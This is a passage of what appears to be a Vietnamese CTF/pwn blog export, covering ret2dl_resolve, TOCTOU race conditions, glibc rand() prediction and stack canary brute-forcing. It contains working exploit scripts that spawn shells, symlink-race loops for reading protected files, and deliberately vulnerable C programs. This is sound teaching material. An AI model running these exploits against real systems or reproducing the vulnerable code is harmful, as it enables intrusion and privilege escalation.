0\n4. write `system` to `addr3`\n\nTrong qu√° tr√¨nh fake th√¨ c√°c chunk ƒë·∫•y ph·∫£i n·∫±m ƒë√∫ng m·ªôt √¥ nh·ªõ 4 byte ho·∫∑c 8 byte ·ªü m·ªôt ƒë·ªãa ch·ªâ -> align khi th·∫•y kh√¥ng ph√π h·ª£p\n\n## Demo\nƒê·∫ßu ti√™n ta ch·∫°y l·ªánh n√†y ƒë·ªÉ note l·∫°i c√°c gi√° tr·ªã \n```c!\n$ readelf -d babystack\n\nDynamic section at offset 0xf14 contains 24 entries:\n  Tag        Type                         Name/Value\n 0x00000001 (NEEDED)                     Shared library: [libc.so.6]\n 0x0000000c (INIT)                       0x80482c8\n 0x0000000d (FINI)                       0x80484f4\n 0x00000019 (INIT_ARRAY)                 0x8049f08\n 0x0000001b (INIT_ARRAYSZ)               4 (bytes)\n 0x0000001a (FINI_ARRAY)                 0x8049f0c\n 0x0000001c (FINI_ARRAYSZ)               4 (bytes)\n 0x6ffffef5 (GNU_HASH)                   0x80481ac\n 0x00000005 (STRTAB)                     0x804822c\n 0x00000006 (SYMTAB)                     0x80481cc\n 0x0000000a (STRSZ)                      80 (bytes)\n 0x0000000b (SYMENT)                     16 (bytes)\n 0x00000015 (DEBUG)                      0x0\n 0x00000003 (PLTGOT)                     0x804a000\n 0x00000002 (PLTRELSZ)                   24 (bytes)\n 0x00000014 (PLTREL)                     REL\n 0x00000017 (JMPREL)                     0x80482b0\n 0x00000011 (REL)                        0x80482a8\n 0x00000012 (RELSZ)                      8 (bytes)\n 0x00000013 (RELENT)                     8 (bytes)\n 0x6ffffffe (VERNEED)                    0x8048288\n 0x6fffffff (VERNEEDNUM)                 1\n 0x6ffffff0 (VERSYM)                     0x804827c\n 0x00000000 (NULL)                       0x0\n```\n\nNote l·∫°i\n```python!\nSYMTAB = 0x080481cc\nSTRTAB = 0x0804822c\nJMPREL = 0x080482b0\n```\n\nV√†o ida th√¨ ta d·ªÖ d√†ng th·∫•y r·∫±ng b·ªã bof\n\n![](https://hackmd.io/_uploads/BkDp5tGj3.png)\n\nV√†o gdb th√¨ th·∫•y r·∫±ng kh√¥ng c√≥ h√†m n√†o th√≠ch h·ª£p ƒë·ªÉ gi√∫p ta leak libc -> ret2dl_resolve\n\n![](https://hackmd.io/_uploads/ByYZotfoh.png)\n\nSau m·ªôt h·ªìi test v·ªõi binary th√¨ th·∫•y r·∫±ng ta c·∫ßn pivot stack v√†o bss() do arguments 1 t·ª©c `reloc_arg` c·∫ßn ph·∫£i ·ªü ƒë·∫ßu stack\n\nQu√° tr√¨nh pivot stack c≈©ng nh∆∞ l√†m sau ƒë·ªÉ bof 1 file x32 s·∫Ω kh√¥ng tr√¨nh b√†y ·ªü ƒë√¢y\n\n```python=\naddr1 = 0x804af00\npayload = b'a'*40 + p32(addr1)\n\npayload +=  p32(exe.plt['read']) + p32(0x8048455)+  p32(0) + p32(addr1) + p32(0x80)\np.send(payload)\n```\n\nTrong ƒë√≥ `0x8048455` l√† gadget `leave_ret`. ·ªû ƒë√¢y ch√∫ng ta th·ª±c hi·ªán ghi 2 l·∫ßn. \n- L·∫ßn 1 t·ª©c payload tr√™n ƒë·ªÉ pivot stack\n- L·∫ßn 2 g·ª≠i payload ret2dl_resolve l√™n bss()\n\nPayload 2 c·ªßa m√¨nh c√≥ d·∫°ng sau\n\n![](https://hackmd.io/_uploads/HJUdgcMi2.png)\n\n\n```python=\naddr1 += 0x14\nreloc_args = (addr1 - JMPREL)\naddr2 = 0x804af1c\nsuccess(\"FAKE ELF32_SYM addr2 : \" + hex(addr2))\nr_info = (addr2- SYMTAB) // 16\nr_info = (r_info <<8) | 0x7\n\nsuccess(\"FAKE ELF32_RELA addr1 : \" + hex(addr1))\nsuccess(\"CACULATED reloc_args: \" + hex(reloc_args))\nsuccess(\"r_info : \" + hex(r_info))\n\nstring = 0x0804af2c - STRTAB\n```\n\nDo `addr1` sau khi ch·∫°y payload 1 ƒëang l√† `rsp`\nn√™n m√¨nh c·ªông th√™m 0x14 t·ª©c ch·ªó ƒë·ªÉ fake `ELF32_Rela` struct.\n\n`string` trong code tr√™n l√† `st_name` fake\n\nPayload sau khi g·ª≠i \n\n![](https://hackmd.io/_uploads/S1i7M9Min.png)\n\nTa c√≥ th·ªÉ th·∫•y l√† c√°c ƒë·ªãa ch·ªâ ta fake n·∫±m tr·ªçn trong 1 √¥ v√πng nh·ªõ. C√°c ƒë·ªãa ch·ªâ kh√°c t√≠nh nh∆∞ c√¥ng th·ª©c m√¨nh ƒë∆∞a ra ·ªü tr√™n .\n\nCh·ªó padding n√†y nh∆∞ sau\n\n![](https://hackmd.io/_uploads/rJbymqMon.png)\n\n\n- `0x804af08` l√† esp t·ª©c l√† `reloc_arg`\n- 2 ƒë·ªãa ch·ªâ ti·∫øp theo l√† ph·∫ßn padding. ·ªû ƒë√¢y m√¨nh g·ª≠i string `sh` v√† ti·∫øp theo m√¨nh g·ª≠i v√†o `0x804af10` ƒë·ªãa ch·ªâ tr·ªè t·ªõi `sh`. L√Ω do c·ªßa vi·ªác ƒë√≥ l√† v√¨ khi ta th·ª±c hi·ªán resolve xong th√¨ n√≥ s·∫Ω th·ª±c hi·ªán h√†m `system` ƒë·∫•y. Do l√† x32 n√™n theo calling convention th√¨ n√≥ expect arguments ·ªü `esp+0x8`\n\nTa ch·∫°y script th√¨ l·∫•y ƒë∆∞·ª£c shell\n\n![](https://hackmd.io/_uploads/BySV4qzoh.png)\n\n\nFull script : \n```python=\nfrom pwn import *\nimport time\nexe = ELF(\"babystack\")\np = process(exe.path)\n\nSYMTAB = 0x080481cc\nSTRTAB = 0x0804822c\nJMPREL = 0x080482b0\n\nGOT = 0x804a010\nret = 0x080482d2\n\naddr1 = 0x804af00\npayload = b'a'*40 + p32(addr1)\n\npayload +=  p32(exe.plt['read']) + p32(0x8048455)+  p32(0) + p32(addr1) + p32(0x80)\np.send(payload)\n\ntime.sleep(1)\n\naddr1 += 0x14\nreloc_args = (addr1 - JMPREL)\nsuccess(\"FAKE ELF32_RELA addr1 : \" + hex(addr1))\nsuccess(\"CACULATED reloc_args: \" + hex(reloc_args))\naddr2 = 0x804af1c\nsuccess(\"FAKE ELF32_SYM addr2 : \" + hex(addr2))\nr_info = (addr2- SYMTAB) // 16\nr_info = (r_info <<8) | 0x7\nsuccess(\"r_info : \" + hex(r_info))\n\nstring = 0x0804af2c - STRTAB\npayload = b'a'*4 + p32(0x80482F0) + p32(reloc_args) + b'sh\\x00\\x00'+p32(0x0804af0c)\npayload += p32(exe.got['read']) + p32(r_info)+p32(string)+p32(0)*3+b'system\\x00'\np.send(payload)\n\np.interactive()\n```\n\n## References\n1. [syst3mfailure](https://syst3mfailure.io/ret2dl_resolve/)\n2. [phrack article ·ªü m·ª•c 5](http://phrack.org/issues/58/4.html)\n3. [ricardo2197](https://gist.github.com/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62) ","tags":["linux"],"categories":["pwn","stack overflow"]},{"title":"TOCTOU attack","url":"/2023/07/04/toctou/","content":"Trong b√†i n√†y m√¨nh s·∫Ω gi·ªõi thi·ªáu qua v·ªÅ TOCTOU (time of check - time of use), m·ªôt h∆∞·ªõng khai th√°c trong race condition c≈©ng nh∆∞ c√°ch setup ƒë∆°n gi·∫£n ƒë·ªÉ khai th√°c v√† gi·∫£i m·ªôt s·ªë b√†i minh ho·∫°. \n\n## Gi·ªõi thi·ªáu\nRace condition l√† m·ªôt l·ªói x·∫£y ra khi th·ª±c hi·ªán m·ªôt lo·∫°t c√°c context switch gi·ªØa m·ªôt process n√†y v·ªõi m·ªôt process kh√°c nh∆∞ng c√°c process ƒë·∫•y l·∫°i x·∫£y ra m√¢u thu·∫´n v·ªõi nhau. TOCTOU l√† m·ªôt d·∫°ng trong s·ªë c√°c m√¢u thu·∫´n ƒë·∫•y v√† x·∫£y ra khi ch∆∞∆°ng tr√¨nh check m·ªôt ƒëi·ªÅu ki·ªán n√†o ƒë√≥ tr∆∞·ªõc khi th·ª±c hi·ªán c√¥ng vi·ªác b·∫•t k·ª≥ nh∆∞ng khi th·ª±c hi·ªán context switch th√¨ ƒëi·ªÅu ki·ªán ƒë·∫•y s·∫Ω kh√¥ng c√≤n ƒë√∫ng n·ªØa v√† s·∫Ω cho ph√©p d·∫´n t·ªõi privilege escalation ho·∫∑c ƒë·ªçc ghi file ngo√†i √Ω mu·ªën.\n\n### Nguy√™n nh√¢n\nNguy√™n nh√¢n ch√≠nh c·ªßa vi·ªác d·∫´n ƒë·∫øn race condition l√† do m√°y t√≠nh cho ph√©p th·ª±c hi·ªán multitask. ƒêi·ªÅu n√†y gi·ªëng nh∆∞ vi·ªác ƒëang m·ªü m·ªôt task Discord v√† m·ªôt task Chrome. M√°y t√≠nh s·∫Ω g√¢y cho ta m·ªôt ng·ªô nh·∫≠n l√† c√°c task n√†y ho·∫°t ƒë·ªông song song v·ªõi nhau nh∆∞ng th·ª±c ch·∫•t l√† t·ª´ng process trong task c·ªßa Discord s·∫Ω ƒëan xen v·ªõi t·ª´ng process trong task c·ªßa Chrome. Nh∆∞ng do t·ªëc ƒë·ªô ho·∫°t ƒë·ªông c·ªßa CPU qu√° nhanh n√™n ta nh·∫ßm t∆∞·ªüng ch√∫ng ho·∫°t ƒë·ªông song song. ƒêi·ªÅu n√†y \"kh√° t∆∞∆°ng t·ª±\" c√°ch m·∫Øt b·∫°n th·∫•y √°nh s√°ng t·ª´ ƒë√®n hu·ª≥nh quang. V·ªÅ b·∫£n ch·∫•t l√† n√≥ ch·ªõp r·ªìi t·∫Øt nh∆∞ng do d√≤ng ƒëi·ªán xoay chi·ªÅu c√≥ t·∫ßn s·ªë l·ªõn n√™n m√¨nh t∆∞·ªüng n√≥ lu√¥n s√°ng.\n\n![](https://hackmd.io/_uploads/Bk1baU-K3.png)\n\nH√¨nh 1 : Vi·ªác m·ªôt process th·ª±c hi·ªán ƒë∆°n l·∫Ω\n\n![](https://hackmd.io/_uploads/BJ_NpLZK2.png)\n\nH√¨nh 2 : L·∫ßm t∆∞·ªüng ch·∫°y 2 process song song\n\n![](https://hackmd.io/_uploads/Sk9Ia8ZF3.png)\n\nH√¨nh 3 : Th·ª±c ch·∫•t vi·ªác m√°y t√≠nh x·ª≠ l√Ω. Vi·ªác chuy·ªÉn t·ª´ c√¥ng vi·ªác c·ªßa m·ªôt process n√†y sang c√¥ng vi·ªác c·ªßa m·ªôt process kh√°c ƒë∆∞·ª£c g·ªçi l√† context switch\n\n\n### TOCTOU\n\nƒê√¢y l√† m·ªôt s·ªë kh·∫£ nƒÉng khi ta ch·∫°y ƒëa lu·ªìng 2 process c√πng access v√†o 1 file:\n\n![](https://hackmd.io/_uploads/SJ2MA8ZY3.png)\n\nM·ªôt trong s·ªë c√°c kh·∫£ nƒÉng ƒë·∫•y s·∫Ω c√≥ t√¨m ·∫©n nguy hi·ªÉm. Ta th·∫•y kh·∫£ nƒÉng ƒë·∫ßu ti√™n nh∆∞ sau\n\n![](https://hackmd.io/_uploads/Hy_cCI-F3.png)\n\nP1 v√† P2 c√πng `check_input` trong c√πng m·ªôt m√¥i tr∆∞·ªùng sau ƒë√≥ P1 `do_action` v·ªõi m√¥i tr∆∞·ªùng ƒë√≥ r·ªìi sau ƒë·∫•y P2 l·∫°i `do_action` v·ªõi m√¥i tr∆∞·ªùng ƒë√£ b·ªã P1 thay ƒë·ªïi => c√≥ bug\n\nTrong kh·∫£ nƒÉng th·ª© 2 th√¨ l·∫°i an to√†n do th·ª±c hi·ªán xong process n√†y m·ªõi t·ªõi process kh√°c\n\n![](https://hackmd.io/_uploads/rJFF7w-Fn.png)\n\nTrong c√°c tr∆∞·ªùng h·ª£p c√≤n l·∫°i th√¨ process sau ƒë·ªÅu th·ª±c hi·ªán `do_action` m√† kh√¥ng `check_input` l·∫°i sau khi c√°c process tr∆∞·ªõc ƒë√≥ ƒë√£ c√≥ t√°c ƒë·ªông t·ªõi m√¥i tr∆∞·ªùng => c√≥ bug\n\n![](https://hackmd.io/_uploads/BJ4_LwbKn.png)\n\n## Setup, demo\n### Setup\n\nƒê·∫ßu ti√™n t·∫°o file c·∫ßn test v√† combile n√≥. ·ªû ƒë√¢y m√¨nh t·∫°o file `vuln.c` \n\n```clike=\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <libgen.h>\n#include <stddef.h>\n#include <fcntl.h>\nint main( int argc, char **argv)\n{\n    int fd = open(argv[1],O_WRONLY | O_CREAT | O_TRUNC,0755);\n    write(fd,\"#!/bin/sh\\necho SAFE\\n\",20);\n    close(fd);                      \n    execl(\"/bin/sh\",\"/bin/sh\",argv[1],NULL);\n}\n```\n\n![](https://hackmd.io/_uploads/rJ9jaw-F3.png)\n\nCode n√†y s·∫Ω ghi bash script v√†o file ƒë·∫øn t·ª´ argument ƒë·∫ßu c·ªßa ta v√† th·ª±c thi n√≥\n\nTi·∫øp theo t·∫°o th√™m flag, file ƒë·ªÉ test exploit : \n\n- file flag\n- file catflag l√† bash script d√πng ƒë·ªÉ cat flag\n```bash!\n#!/bin/sh\ncat flag\n```\n\n![](https://hackmd.io/_uploads/SJT6qFWt2.png)\n\n\n### Demo exploit\n#### B√†i setup \n·ªû ƒë√¢y ta chia h∆∞·ªõng ho·∫°t ƒë·ªông c·ªßa ch∆∞∆°ng tr√¨nh th√†nh 3 vi·ªác nh·ªè:\n - M·ªü file t·ª´ argument ƒë·∫ßu\n - Ghi file\n - Th·ª±c thi file\n\nTa c√≥ nh·∫≠n x√©t l√† ch∆∞∆°ng tr√¨nh kh√¥ng check vi·ªác file ƒëang th·ª±c thi c√≥ ƒë√∫ng l√† file ta ƒë√£ m·ªü kh√¥ng n√™n c√≥ c√≥ th·ªÉ t·∫•n c√¥ng b·∫±ng TOCTOU nh·ªù v√†o file `catflag` cho s·∫µn.\n\n![](https://hackmd.io/_uploads/HkO1SdbK2.png)\n\nTa c√≥ h∆∞·ªõng t·∫•n c√¥ng nh∆∞ sau : t·∫°o m·ªôt process ch·∫°y song song ƒë·ªÉ ghi ƒë√® `cat flag` v√†o sau khi process g·ªëc th·ª±c hi·ªán xong vi·ªác \"ghi file\". ƒê·ªÉ th·ª±c hi·ªán ƒë∆∞·ª£c ƒëi·ªÅu ƒë√≥ ta c·∫ßn timing h·ª£p l√Ω (tu·ª≥ v√†o nh√¢n ph·∫©m).\n\n![](https://hackmd.io/_uploads/r1gGXuZF2.png)\n\n\nDo ƒë√≥ ta vi·∫øt shell script ƒë·ªÉ spam vi·ªác copy content c·ªßa file `catflag` sang file `test` t·∫°o ra t·ª´ ch∆∞∆°ng tr√¨nh\n\n```bash!\n while /bin/true; do cp -v catflag test;done\n```\n\n![](https://hackmd.io/_uploads/HkKTotZF3.png)\n\nSau ƒë√≥ ta m·ªü tab kh√°c ƒë·ªÉ ch·∫°y ch∆∞∆°ng tr√¨nh g·ªëc.\n\n![](https://hackmd.io/_uploads/BJXV2Kbth.png)\n\nTa c√≥ nh·∫≠n x√©t l√† kh√¥ng ph·∫£i c·ª© ch·∫°y l√† r√† flag m√† tu·ª≥ v√†o th·ªùi c∆°.\n\n#### tic-tac (PICO-CTF-2023)\nƒê·ªÅ b√†i cho ta 3 file g·ªìm: flag.txt, src.cpp v√† file binary txtreader.\n\nFile source nh∆∞ sau:\n```clike=\n#include <iostream>\n#include <fstream>\n#include <unistd.h>\n#include <sys/stat.h>\n\nint main(int argc, char *argv[]) {\n  if (argc != 2) {\n    std::cerr << \"Usage: \" << argv[0] << \" <filename>\" << std::endl;\n    return 1;\n  }\n\n  std::string filename = argv[1];\n  std::ifstream file(filename);\n  struct stat statbuf;\n\n  // Check the file's status information.\n  if (stat(filename.c_str(), &statbuf) == -1) {\n    std::cerr << \"Error: Could not retrieve file information\" << std::endl;\n    return 1;\n  }\n\n  // Check the file's owner.\n  if (statbuf.st_uid != getuid()) {\n    std::cerr << \"Error: you don't own this file\" << std::endl;\n    return 1;\n  }\n\n  // Read the contents of the file.\n  if (file.is_open()) {\n    std::string line;\n    while (getline(file, line)) {\n      std::cout << line << std::endl;\n    }\n  } else {\n    std::cerr << \"Error: Could not open file\" << std::endl;\n    return 1;\n  }\n\n  return 0;\n}\n```\n\nTa c≈©ng c√≥ th·ªÉ chia c√°ch ho·∫°t ƒë·ªông c·ªßa ch∆∞∆°ng tr√¨nh th√†nh 3 h∆∞·ªõng nh∆∞ sau:\n- Nh·∫≠n input\n- Check input\n- M·ªü input \n\nDo ·ªü ƒë√¢y kh√¥ng c√≥ s·∫µn file n√†o gi√∫p \"thay th·∫ø\" nh∆∞ tr√™n n√™n ta s·∫Ω l·ª£i d·ª•ng b·∫±ng linking (ln) qua m·ªôt file th·ª© 3.\n\nTa chia c√¥ng vi·ªác linking th√†nh 2 ph·∫ßn nh∆∞ sau\n- Link file `test` v·ªõi file `src.c` b·∫±ng `ln -sf test src.c`\n- Link file `test` v·ªõi file `flag.txt` b·∫±ng `ln -sf test flag.txt`\n\nM·ª•c ƒë√≠ch c·ªßa ta l√† ch·∫°y 2 ch∆∞∆°ng tr√¨nh c√πng l√∫c ƒë·ªÉ trigger context gi·ªëng ·∫£nh\n\n![](https://hackmd.io/_uploads/SJ1hf9bF2.png)\n\nDo file `src.cpp` kh√° d√†i n√™n m√¨nh `ln` qua file th·ª© 3 t√™n `lmao`, v·ªÅ b·∫£n ch·∫•t th√¨ logic kh√¥ng thay ƒë·ªïi .\n\n![](https://hackmd.io/_uploads/r1s0dqWY2.png)\n\nTi·∫øp theo m√¨nh ch·∫°y l·ªánh n√†y ƒë·ªÉ th·ª±c hi·ªán vi·ªác spam `ln` li√™n ti·∫øp. Trong ƒë√≥ d·∫•u `&` cu·ªëi cho ph√©p ta th·ª±c hi·ªán ti·∫øp m√† kh√¥ng ph·∫£i ƒë·ª£i l·ªánh n√†y xong. \n\n```bash\nwhile true ; do ln -sf flag.txt test; ln -sf lmao test;done &\n```\nCu·ªëi c√πng ch·∫°y l·ªánh n√†y ƒë·ªÉ trigger toctou b·∫±ng c√°ch spam ti·∫øp ch∆∞∆°ng tr√¨nh g·ªëc\n```bash\nfor i in {1..100}; do ./txtreader test ;done\n```\n\n![](https://hackmd.io/_uploads/HyJ6tqZF2.png)\n\nV√† h√™n l√† ta ƒë√£ c√≥ flag\n\n## Tham kh·∫£o\n1. [pwn.college](https://pwn.college/system-security/race-conditions)\n2. [Exploiting a Race Condition](https://samsclass.info/127/proj/E10.htm)","tags":["linux","toctou","race condition"],"categories":["pwn"]},{"title":"rand() vulnerability","url":"/2023/05/12/rand-vuln/","content":"# rand() vulnerability\n\n## V·∫•n ƒë·ªÅ\nGi·∫£ s·ª≠ ta c√≥ ƒëo·∫°n code sau ƒë√¢y ƒë∆∞·ª£c compile b·∫±ng `gcc -o rand rand.c`\n\n```cpp=\n#include <stdio.h>\nint main()\n{\n        int input ;\n        scanf(\"%d\",&input) ;\n        srand(time(NULL));\n        if (rand() == input) system(\"/bin/sh\");\n        else puts(\"NOOB\") ;\n        return 0 ;\n}\n```\n\nM·ª•c ƒë√≠ch c·ªßa ta l√† l√†m sao ƒë·ªÉ input b·∫±ng output c·ªßa `rand()` trong C. ƒê·ªÉ gi·∫£i quy·∫øt ƒë∆∞·ª£c b√†i to√°n n√†y, ta s·∫Ω t√¨m hi·ªÉu s∆° l∆∞·ª£c v·ªÅ pseudorandom number generator (PRNG) c≈©ng nh∆∞ c√°ch h√†m `rand()` ƒë∆∞·ª£c implement trong glibc.\n\n## ƒêi·ªÅu g√¨ l√†m m·ªôt s·ªë random l√† m·ªôt s·ªë random ?\n### Pseudorandom number generator\nHi·ªÉu m·ªôt c√°ch ƒë∆°n gi·∫£n, s·ªë random th·ª±c s·ª± l√† m·ªôt s·ªë ƒë∆∞·ª£c t·∫°o ra ho√†n to√†n ng·∫ßu nhi√™n, kh√¥ng sinh ra d·ª±a tr√™n quy lu·∫≠t hay b·∫•t k·ª≥ m·ª•c ƒë√≠ch n√†o c·∫£. V√≠ d·ª• ƒë∆°n gi·∫£n nh·∫•t ch√≠nh l√† m·∫≠t ƒë·ªô kh√≠ $O_2$ hi·ªán t·∫°i trong ph√≤ng b·∫°n, ti·∫øng ·ªìn ·ªü m·ªôt n∆°i b·∫•t k·ª≥, tung x√≠ ng·∫ßu,... V√† v√¨ th·∫ø, c√°c tr∆∞·ªùng h·ª£p m√† b·∫°n c√≥ kh·∫£ nƒÉng ƒëi·ªÅu khi·ªÉn c√°c d·ªØ ki·ªán g·ªëc hay n√≥i m·ªôt c√°ch kh√°c l√† t·∫°o ra d·ª±a tr√™n m·ªôt quy lu·∫≠t, m·ªôt thu·∫≠t to√°n sinh n√†o ƒë√≥ th√¨ ƒë∆∞·ª£c g·ªçi l√† PRNG.\n\nƒê·ªÉ ph·ª•c v·ª• nhu c·∫ßu t·∫°o s·ªë random tr√™n m√°y t√≠nh ng∆∞·ªùi ta ƒë√£ ƒë·∫øn v·ªõi m·ªôt gi·∫£i ph√°p l√† s·ª≠ d·ª•ng deterministic algorithm ƒë·ªÉ t·∫°o ra m·ªôt s·ªë trong c√≥ v·∫ª l√† random nh∆∞ng th·ª±c ch·∫•t l√† kh√¥ng random. M·ªôt trong nh·ªØng c√°ch ƒë·ªÉ implement n√≥ ch√≠nh l√† s·ª≠ d·ª•ng linear congruential generator, v√† c√°ch n√†y ƒë∆∞·ª£c s√†i ·ªü h√†m rand() trong C.\n\n### Linear congruential generator (LCG)\nThu·∫≠t to√°n n√†y nh·∫±m m·ª•c ƒë√≠ch t·∫°o ra m·ªôt s·ªë random d·ª±a tr√™n m·ªôt seed cho tr∆∞·ªõc. ƒêi·ªÅu n√†y ƒë·ªìng nghƒ©a v·ªõi vi·ªác n·∫øu ta l·∫•y c√πng m·ªôt seed ƒë√≥ ƒë·ªÉ sinh ra trong m·ªói l·∫ßn ch·∫°y ch∆∞∆°ng tr√¨nh th√¨ v·∫´n ƒë∆∞·ª£c c√°c s·ªë random ra y chang nhau.\n\nC√¥ng th·ª©c truy h·ªìi c·ªßa LCG nh∆∞ sau:\n$x_{n+1} = (ax_n + c) \\mod m$\n\nTrong ƒë√≥ : \n- $x_n$ l√† s·ªë random tr∆∞·ªõc ƒë√≥\n- $x_{n+1}$ l√† s·ªë random s·∫Ω ƒë∆∞·ª£c t·∫°o ra\n- $a, c, m$ l√† h·∫±ng s·ªë quy·∫øt ƒë·ªãnh t√≠nh ch·∫•t c·ªßa s·ªë random\n- $x_0$ l√† seed ƒë∆∞·ª£c cung c·∫•p.\n\n## rand() trong glibc\n\nH√†m `rand()` trong C s·∫Ω g·ªçi t·ªõi`__random()` v√† `__random_r()` s·∫Ω ƒë·∫£m nh·∫≠n vi·ªác t·∫°o ra s·ªë random\n\n![](https://hackmd.io/_uploads/SyB-yEs43.png)\n\n![](https://hackmd.io/_uploads/rJeukVoN2.png)\n\nTrong ƒë√≥, `__random_r()` s·ª≠ d·ª•ng 2 c∆° ch·∫ø ƒë·ªÉ random, single state (kh√∫c trong if TYPE_0) v√† kh√∫c multistate (m√¨nh t·ª± g·ªçi). \n\nSingle state l√† thu·∫≠t to√°n ƒë∆°n gi·∫£n v√¨ ch·ªâ s·ª≠ d·ª•ng duy nh·∫•t m·ªôt \"ki·ªÉu\" sinh. Thu·∫≠t to√°n n√†y c√≥ khuy·∫øt ƒëi·ªÉm l√† v·ªõi m·ªôt s·ªë n√†o ƒë√≥ ƒë∆∞·ª£c sinh ra th√¨ ta s·∫Ω g·∫∑p l·∫°i s·ªë ƒë√≥ sau $2^{31}$ l·∫ßn g·ªçi `rand()`. C√°ch n√†y ƒë∆∞·ª£c g·ªçi l√† `TYPE_0` trong source glibc.\n\nMultistate cho ph√©p ta g·∫∑p l·∫°i s·ªë tr√πng nhau do ƒë√£ c√≥ m·ªôt v√†i c·∫£i ti·∫øn so v·ªõi thu·∫≠t to√°n tr√™n. State n√†y ho·∫°t ƒë·ªông nh∆∞ sau : \n\nV·ªõi m·ªôt seed s, v√† m·∫£ng $r_0...r_{33}$, s·ªë ƒë∆∞·ª£c sinh ra s·∫Ω tho·∫£:\n- $r_0 = s$\n- $r_i = (16807 \\times (\\text{signed int}) r_{i-1}) \\mod 2147483647$ (i = 1 ... 30)\n- $r_i = r_{i-31}$ (i = 31...33) \n\nT·ª´ $r_{34}$ tr·ªü ƒëi thu·∫≠t to√°n s·∫Ω th√†nh:\n- $r_i = (r_{i-3} + r_{i-31}) \\mod 4294967296$ (i ‚â• 34)\n\nK·∫øt qu·∫£ h√†m rand() th·ª© i s·∫Ω l√†: $r_i + 344 >> 1$\nKhi ta set seed b·∫±ng `srand()` th√¨ s·∫Ω m·∫∑c ƒë·ªãnh s√†i c√°i multistate\nTa c√≥ code ch·∫°y multistate ƒë∆∞·ª£c vi·∫øt l·∫°i nh∆∞ sau:\n```cpp=\n#include <stdio.h>\n\n#define MAX 1000\n#define seed SET_YOURS\n\nmain() {\n  int r[MAX];\n  int i;\n\n  r[0] = seed;\n  for (i=1; i<31; i++) {\n    r[i] = (16807LL * r[i-1]) % 2147483647;\n    if (r[i] < 0) {\n      r[i] += 2147483647;\n    }\n  }\n  for (i=31; i<34; i++) {\n    r[i] = r[i-31];\n  }\n  for (i=34; i<344; i++) {\n    r[i] = r[i-31] + r[i-3];\n  }\n  for (i=344; i<MAX; i++) {\n    r[i] = r[i-31] + r[i-3];\n    printf(\"%d\\n\", ((unsigned int)r[i]) >> 1);\n  }\n}\n\n```\n\nN·∫øu b·∫°n compile r·ªìi ch·∫°y th·ª≠ code tr√™n th√¨ s·ªë ƒë∆∞·ª£c t·∫°o ra s·∫Ω y chang khi s√†i `rand()`\n## Khai th√°c\nV·∫≠y ta ƒë√£ bi·∫øt s∆° l∆∞·ª£c v·ªÅ c√°ch h√†m `rand()` ho·∫°t ƒë·ªông trong C. V·ªõi code ƒë·ªÅ b√†i ƒë∆∞a ra, ta c√≥ nh·∫≠n x√©t l√† seed ƒë∆∞·ª£c t·∫°o ra ch√≠nh l√† th·ªùi ƒëi·ªÉm ta k·∫øt n·ªëi v·ªõi server. Trong python c√≥ m·ªôt th∆∞ vi·ªán h·ªØu √≠ch Ctypes, cho ph√©p s·ª≠ d·ª•ng c√°c h√†m c√≥ s·∫µn trong C (n·∫øu b·∫°n kh√¥ng th√≠ch s√†i th√¨ code l·∫°i nguy√™n h√†m `time()` c≈©ng nh∆∞ `rand()` c≈©ng ƒë∆∞·ª£c). ·ªû ƒë√¢y ta th·∫•y `time()` s·∫Ω ƒë∆∞·ª£c t√≠nh k·ªÉ t·ª´ th·ªùi ƒëi·ªÉm ch∆∞∆°ng tr√¨nh g·ªçi n√≥, do v·∫≠y khi code python ta ch·∫°y th√¨ h√™n xui s·∫Ω c√≥ m·ªôt ƒë·ªô delay nh·∫•t ƒë·ªãnh so v·ªõi server. Do v·∫≠y n·∫øu kh√¥ng ƒë∆∞·ª£c ta s·∫Ω th·ª≠ t·ª´ng `time+1, time+2,...` ƒë·ªÉ ƒë·ªìng b·ªô.\n\nScript : \n```python=\nfrom pwn import *\nfrom ctypes import CDLL\n\nlibc = CDLL(\"/lib/x86_64-linux-gnu/libc.so.6\")\np = remote(\"localhost\",6666)\nlibc.srand(libc.time(0))\np.sendline(str(libc.rand()))\np.interactive()\n```\n·ªû ƒë√¢y h√™n l√† code m√¨nh ƒë·ªìng b·ªô v·ªõi server lu√¥n. Ch·∫°y v√† ta c√≥ ƒë∆∞·ª£c shell \n\n![](https://hackmd.io/_uploads/BkStiViN2.png)\n\n## References\n1. [The GLIBC random number generator](https://www.mscs.dal.ca/~selinger/random/)\n2. [glibc rand function implementation](https://stackoverflow.com/questions/18634079/glibc-rand-function-implementation)\n3. [rand() source](https://codebrowser.dev/glibc/glibc/stdlib/random_r.c.html#35buf)\n","tags":["linux","rand"],"categories":["pwn"]},{"title":"Bruteforce Stack Canary x86-64 Linux","url":"/2023/04/28/bruteforce-canary/","content":"# Bruteforce Stack Canary x86-64 Linux\n\n## Gi·ªõi thi·ªáu\nNh∆∞ ·ªü b√†i [tr∆∞·ªõc](https://hackmd.io/OgqVhSZZR3CCszA9GwcrTA) ta ƒë√£ bi·∫øt ƒë∆∞·ª£c stack canary l√† m·ªôt c∆° ch·∫ø ƒë·ªÉ ngƒÉn ch·∫∑n buffer overflow. ƒê√¢y l√† m·ªôt gi√° tr·ªã ƒë·ªÉ tr∆∞·ªõc return address v√† ƒë∆∞·ª£c check tr∆∞·ªõc khi return 1 stack frame nh·∫±m tr√°nh overflow. Do ƒë√≥ ƒë·ªÉ chuy·ªÉn h∆∞·ªõng ho·∫°t ƒë·ªông c·ªßa ch∆∞∆°ng tr√¨nh, ta c·∫ßn t·∫•n c√¥ng b·∫±ng 1 trong 2 c√°ch sau: leak ho·∫∑c bruteforce stack canary. Trong b√†i n√†y s·∫Ω t·∫•n c√¥ng b·∫±ng c√°ch th·ª© 2.\n\n## Ch∆∞∆°ng tr√¨nh khai th√°c\n<details>\n<summary>CODE </summary>\n    \n```clike\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <string.h>\n#include <sys/types.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n\n#define PORT 6969\nint client = 0  ;\n\nvoid vuln(int client_socket) {\n    char *output = \"vuln read : \";\n    char n[10] ;\n    send(client_socket, output, strlen(output), 0);\n    read(client_socket,n,0x1000);\n\n}\n\nvoid win()\n{\n        send(client,\"YOU WIN\",strlen(\"YOU WIN\"),0) ;\n}\n\nint main() {\n    int server_fd, new_socket, valread;\n    struct sockaddr_in address;\n    int addrlen = sizeof(address);\n\n    // Create socket file descriptor\n    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) 